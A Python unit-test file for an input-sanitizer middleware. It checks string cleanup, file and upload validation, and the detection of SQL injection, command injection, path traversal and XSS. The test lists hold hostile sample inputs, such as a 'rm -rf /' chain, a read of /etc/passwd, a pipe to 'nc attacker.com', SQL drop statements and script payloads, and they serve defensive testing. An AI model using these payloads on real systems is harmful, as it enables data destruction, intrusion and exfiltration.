"""
Unit Tests for Input Sanitizer

Tests input sanitization and validation.
"""

import pytest
from app.middleware.input_sanitizer import InputSanitizer, sanitize_user_input, validate_uploaded_file
from unittest.mock import Mock


class TestInputSanitizer:
    """Test InputSanitizer"""
    
    def test_sanitize_string_basic(self):
        """Test basic string sanitization"""
        sanitizer = InputSanitizer()
        
        result = sanitizer.sanitize_string("  test string  ")
        
        assert result == "test string"
    
    def test_sanitize_string_removes_null_bytes(self):
        """Test that null bytes are removed"""
        sanitizer = InputSanitizer()
        
        result = sanitizer.sanitize_string("test\x00string")
        
        assert result == "teststring"
        assert "\x00" not in result
    
    def test_sanitize_string_length_limit(self):
        """Test length limit enforcement"""
        sanitizer = InputSanitizer()
        
        long_string = "a" * 2000
        
        with pytest.raises(ValueError, match="exceeds maximum length"):
            sanitizer.sanitize_string(long_string, max_length=1000)
    
    def test_validate_no_sql_injection_safe(self):
        """Test SQL injection detection - safe input"""
        sanitizer = InputSanitizer()
        
        safe_input = "normal user input"
        
        # Should not raise
        assert sanitizer.validate_no_sql_injection(safe_input)
    
    def test_validate_no_sql_injection_dangerous(self):
        """Test SQL injection detection - dangerous input"""
        sanitizer = InputSanitizer()
        
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users",
        ]
        
        for dangerous in dangerous_inputs:
            with pytest.raises(ValueError, match="SQL patterns"):
                sanitizer.validate_no_sql_injection(dangerous)
    
    def test_validate_no_command_injection_safe(self):
        """Test command injection detection - safe input"""
        sanitizer = InputSanitizer()
        
        safe_input = "normal command"
        
        assert sanitizer.validate_no_command_injection(safe_input)
    
    def test_validate_no_command_injection_dangerous(self):
        """Test command injection detection - dangerous input"""
        sanitizer = InputSanitizer()
        
        dangerous_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
            "test $(whoami)",
        ]
        
        for dangerous in dangerous_inputs:
            with pytest.raises(ValueError, match="command patterns"):
                sanitizer.validate_no_command_injection(dangerous)
    
    def test_validate_no_path_traversal_safe(self):
        """Test path traversal detection - safe input"""
        sanitizer = InputSanitizer()
        
        safe_input = "normal/path/file.txt"
        
        assert sanitizer.validate_no_path_traversal(safe_input)
    
    def test_validate_no_path_traversal_dangerous(self):
        """Test path traversal detection - dangerous input"""
        sanitizer = InputSanitizer()
        
        dangerous_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "~/secret_file",
            "/etc/passwd",
        ]
        
        for dangerous in dangerous_inputs:
            with pytest.raises(ValueError, match="path patterns"):
                sanitizer.validate_no_path_traversal(dangerous)
    
    def test_validate_no_xss_safe(self):
        """Test XSS detection - safe input"""
        sanitizer = InputSanitizer()
        
        safe_input = "normal text with <b>bold</b>"
        
        # Basic HTML tags are OK, but scripts are not
        # This might raise depending on implementation
        # For now, test that it doesn't crash
        try:
            sanitizer.validate_no_xss(safe_input)
        except ValueError:
            pass  # Expected for some implementations
    
    def test_validate_no_xss_dangerous(self):
        """Test XSS detection - dangerous input"""
        sanitizer = InputSanitizer()
        
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='evil.com'></iframe>",
        ]
        
        for dangerous in dangerous_inputs:
            with pytest.raises(ValueError, match="XSS patterns"):
                sanitizer.validate_no_xss(dangerous)
    
    def test_sanitize_filename(self):
        """Test filename sanitization"""
        sanitizer = InputSanitizer()
        
        # Test path removal
        assert sanitizer.sanitize_filename("/path/to/file.txt") == "file.txt"
        assert sanitizer.sanitize_filename("..\\..\\file.txt") == "file.txt"
        
        # Test dangerous character removal
        assert sanitizer.sanitize_filename("file<>:|?.txt") == "file.txt"
        
        # Test length limit
        long_name = "a" * 300 + ".txt"
        result = sanitizer.sanitize_filename(long_name)
        assert len(result) <= 255
    
    def test_validate_file_extension(self):
        """Test file extension validation"""
        sanitizer = InputSanitizer()
        
        # Valid extensions
        assert sanitizer.validate_file_extension("config.json", ["json", "yaml"])
        assert sanitizer.validate_file_extension("config.yaml", ["json", "yaml"])
        
        # Invalid extension
        with pytest.raises(ValueError, match="not allowed"):
            sanitizer.validate_file_extension("script.exe", ["json", "yaml"])
    
    def test_validate_json(self):
        """Test JSON validation"""
        sanitizer = InputSanitizer()
        
        # Valid JSON
        result = sanitizer.validate_json('{"key": "value"}')
        assert result == {"key": "value"}
        
        # Invalid JSON
        with pytest.raises(ValueError, match="Invalid JSON"):
            sanitizer.validate_json("not json")
    
    def test_validate_yaml(self):
        """Test YAML validation"""
        sanitizer = InputSanitizer()
        
        # Valid YAML
        result = sanitizer.validate_yaml("key: value")
        assert result == {"key": "value"}
        
        # Invalid YAML
        with pytest.raises(ValueError, match="Invalid YAML"):
            sanitizer.validate_yaml("key: [unclosed")
    
    def test_sanitize_dict(self):
        """Test dictionary sanitization"""
        sanitizer = InputSanitizer()
        
        data = {
            "key1": "  value1  ",
            "key2": {
                "nested": "  nested_value  ",
            },
            "key3": ["  item1  ", "  item2  "],
        }
        
        result = sanitizer.sanitize_dict(data)
        
        assert result["key1"] == "value1"
        assert result["key2"]["nested"] == "nested_value"
        assert result["key3"][0] == "item1"
    
    def test_sanitize_dict_max_depth(self):
        """Test dictionary depth limit"""
        sanitizer = InputSanitizer()
        
        # Create deeply nested dict
        deep_dict = {"level1": {"level2": {"level3": {"level4": {"level5": {}}}}}}
        
        # Should raise with low max_depth
        with pytest.raises(ValueError, match="nesting too deep"):
            sanitizer.sanitize_dict(deep_dict, max_depth=3)


class TestConvenienceFunctions:
    """Test convenience functions"""
    
    def test_sanitize_user_input(self):
        """Test sanitize_user_input function"""
        result = sanitize_user_input("  test input  ")
        assert result == "test input"
    
    def test_validate_uploaded_file(self):
        """Test validate_uploaded_file function"""
        # Mock file object
        mock_file = Mock()
        mock_file.name = "config.json"
        mock_file.size = 1024  # 1 KB
        
        result = validate_uploaded_file(mock_file, ["json", "yaml"], max_size_mb=10)
        
        assert result == "config.json"
    
    def test_validate_uploaded_file_too_large(self):
        """Test file size validation"""
        mock_file = Mock()
        mock_file.name = "large_file.json"
        mock_file.size = 20 * 1024 * 1024  # 20 MB
        
        with pytest.raises(ValueError, match="exceeds maximum"):
            validate_uploaded_file(mock_file, ["json"], max_size_mb=10)
    
    def test_validate_uploaded_file_invalid_extension(self):
        """Test file extension validation"""
        mock_file = Mock()
        mock_file.name = "script.exe"
        mock_file.size = 1024
        
        with pytest.raises(ValueError, match="not allowed"):
            validate_uploaded_file(mock_file, ["json", "yaml"])
